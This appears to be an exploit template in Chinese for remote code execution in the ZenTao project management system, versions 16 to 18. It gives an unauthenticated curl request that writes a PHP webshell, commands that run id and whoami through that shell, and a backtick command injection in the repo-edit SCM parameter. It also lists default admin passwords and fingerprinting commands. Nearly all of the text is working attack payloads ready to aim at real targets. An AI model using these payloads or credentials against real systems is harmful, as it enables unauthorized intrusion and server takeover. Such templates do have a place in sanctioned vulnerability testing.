---
id: ZENTAO-RCE
title: 禅道项目管理系统远程代码执行漏洞
product: zentao
vendor: 青岛易软天创
version_affected: "v16.x, v17.x, v18.x"
severity: CRITICAL
tags: [rce, auth_bypass, 国产, 无需认证]
fingerprint: ["禅道", "ZenTao", "zentao", "/zentao/", "zentaopms"]
---

## 漏洞描述

禅道项目管理系统存在多个远程代码执行漏洞，包括认证绕过+RCE、后台命令注入等。

## 影响版本

- 禅道项目管理系统 v16.x, v17.x, v18.x

## 前置条件

- 目标运行禅道项目管理系统且可通过网络访问
- api-getModel 文件写入方式无需认证
- repo-edit 命令注入方式需要后台管理员权限

## 利用步骤

### api-getModel 文件写入RCE

禅道 api-getModel 接口可绕过认证写入PHP文件:
```http
POST /zentao/api-getModel-editor-save-filepath=L3RtcC90ZXN0LnBocA==.json HTTP/1.1
Host: target
Content-Type: application/json

{"fileContent":"<?php system($_GET['cmd']);?>"}
```

然后访问: `GET /tmp/test.php?cmd=whoami`

### repo-edit 命令注入

后台repo管理模块SCM参数存在命令注入:
```http
POST /zentao/repo-edit-10000-10000.html HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

SCM=Gitlab&serviceHost=http://target&serviceProject=`id`
```

### 默认凭据

- `admin` / `123456`
- `admin` / `admin`
- `admin` / `Admin123`
- `demo` / `demo123`

## Payload

### api-getModel 文件写入（无需认证）

```bash
curl -X POST "http://target/zentao/api-getModel-editor-save-filepath=L3RtcC90ZXN0LnBocA==.json" \
  -H "Content-Type: application/json" \
  -d '{"fileContent":"<?php echo shell_exec($_GET[\"cmd\"]);?>"}'
```

### 访问 webshell

```bash
curl "http://target/tmp/test.php?cmd=id"
```

### repo-edit 命令注入（需认证）

```bash
curl -X POST "http://target/zentao/repo-edit-10000-10000.html" \
  -b "zentaosid=<session_id>" \
  -d "SCM=Gitlab&serviceHost=http://target&serviceProject=\`id\`"
```

## 验证方法

- 文件写入方式：访问写入的 PHP 文件，响应中包含命令执行结果（如 `uid=0(root)`）即确认
- 命令注入方式：响应中包含 `uid=` 等命令输出即确认

```bash
# 验证webshell是否写入成功
curl -s "http://target/tmp/test.php?cmd=whoami"
```

## 指纹确认

```bash
curl -s http://target/zentao/ | grep -i "zentao\|禅道"
curl -s http://target/zentao/user-login.html
```
